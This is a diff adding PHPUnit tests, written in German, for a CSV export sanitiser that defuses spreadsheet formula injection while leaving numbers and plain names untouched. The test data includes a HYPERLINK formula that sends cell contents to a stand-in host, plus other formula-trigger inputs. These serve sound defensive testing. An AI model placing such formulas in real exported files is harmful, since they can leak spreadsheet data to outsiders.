@@ -179,4 +179,54 @@ final class JahresabschlussTest extends TestCase
 
         self::assertStringStartsWith("\xEF\xBB\xBF", (string) file_get_contents($this->verzeichnis . '/klassen.csv'));
     }
+
+    /**
+     * Excel und LibreOffice lesen jede Zelle, die mit =, +, -, @, einem
+     * Tabulator oder einem Wagenruecklauf beginnt, als Formel. Im Archiv
+     * stehen Namen und Freitexte aus einem Formular ohne Anmeldung.
+     */
+    public function testFormelnImArchivWerdenZuText(): void
+    {
+        $methode = new \ReflectionMethod(Jahresabschluss::class, 'entschaerfe');
+        $methode->setAccessible(true);
+
+        $gefaehrlich = [
+            '=HYPERLINK("http://fremd.example/"&A1;"hier klicken")',
+            '+1+1',
+            '-1+1',
+            '@SUM(A1:A9)',
+            "\tmit Tabulator",
+            "\rmit Wagenruecklauf",
+        ];
+
+        foreach ($gefaehrlich as $wert) {
+            self::assertSame("'" . $wert, $methode->invoke(null, $wert), var_export($wert, true));
+        }
+    }
+
+    /**
+     * Zahlen muessen Zahlen bleiben, sonst laesst sich die Spalte nicht
+     * mehr rechnen - auch negative.
+     */
+    public function testZahlenBleibenUnangetastet(): void
+    {
+        $methode = new \ReflectionMethod(Jahresabschluss::class, 'entschaerfe');
+        $methode->setAccessible(true);
+
+        foreach (['-5', '-5.5', '5', '0', -3, 0] as $wert) {
+            self::assertSame((string) $wert, $methode->invoke(null, $wert), var_export($wert, true));
+        }
+    }
+
+    public function testGewoehnlicheWerteBleibenGleich(): void
+    {
+        $methode = new \ReflectionMethod(Jahresabschluss::class, 'entschaerfe');
+        $methode->setAccessible(true);
+
+        self::assertSame('Mia Schuster', $methode->invoke(null, 'Mia Schuster'));
+        self::assertSame('Wert mit = in der Mitte', $methode->invoke(null, 'Wert mit = in der Mitte'));
+        self::assertSame('', $methode->invoke(null, ''));
+        self::assertSame('', $methode->invoke(null, null), 'NULL wird zur leeren Zelle');
+    }
+
 }
